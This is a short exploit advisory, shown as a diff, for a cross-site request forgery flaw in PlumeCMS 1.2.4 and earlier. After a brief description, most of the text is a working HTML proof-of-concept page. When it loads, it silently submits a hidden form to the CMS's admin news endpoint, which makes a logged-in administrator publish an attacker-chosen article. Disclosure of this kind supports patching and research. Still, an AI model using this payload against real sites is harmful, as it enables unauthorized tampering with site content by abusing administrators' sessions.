@@ -1,0 +1,45 @@
++--------------------------------------------------------------------------------------------------------------------------------+
+# Exploit Title : PlumeCMS <= 1.2.4 CSRF Vulnerability
+# Date          : 20-02-2012
+# Author        : Ivano Binetti (http://ivanobinetti.com)
+# Software link : http://sourceforge.net/projects/pxsystem/files/latest/download?source=directory
+# Vendor site   : http://pxsystem.sourceforge.net/
+# Version       : 1.2.4 (latest) and lower
+# Tested on     : Debian Squeeze (6.0)
++--------------------------------------------------------------------------------------------------------------------------------+
++------------------------------------------[Insert and publish NEWS by Ivano Binetti]--------------------------------------------------+
+Summary
+
+1)Vulnerability Description
+2)Exploit
+
++---------------------------------------------------------------------------------------------------------------------------------+
+
+1)Vulnerability Description
+
+PlumeCMS is prone to a CSRF Vulnerability which allows an attacker to insert and publish "News" (as PlumeCMS names his articles) when an 
+authenticated admin browses a web page containing the following html/javascript code.
+
+2)Exploit 
+
+<html>
+<body onload="javascript:document.forms[0].submit()">
+<H2>CSRF Exploit to add and publish News</H2>
+<form method="POST" name="form0" action="http://localhost:80/plume/manager/news.php">
+<input type="hidden" name="n_category_id" value="1"/>
+<input type="hidden" name="n_content_format" value="html"/>
+<input type="hidden" name="n_status" value="1"/>
+<input type="hidden" name="n_comment_support" value="1"/>
+<input type="hidden" name="n_subtype" value="2"/>
+<input type="hidden" name="n_title" value="hacked news"/>
+<input type="hidden" name="n_content" value="%3Cp%3Etest2%3C%2Fp%3E"/>
+<input type="hidden" name="n_subject" value=""/>
+<input type="hidden" name="n_titlewebsite" value=""/>
+<input type="hidden" name="n_linkwebsite" value=""/>
+<input type="hidden" name="publish" value="Save+%5Bs%5D"/>
+</form>
+</body>
+</html>
+
+
++----------------------------------------------------------------------------------------------------------------------------------+
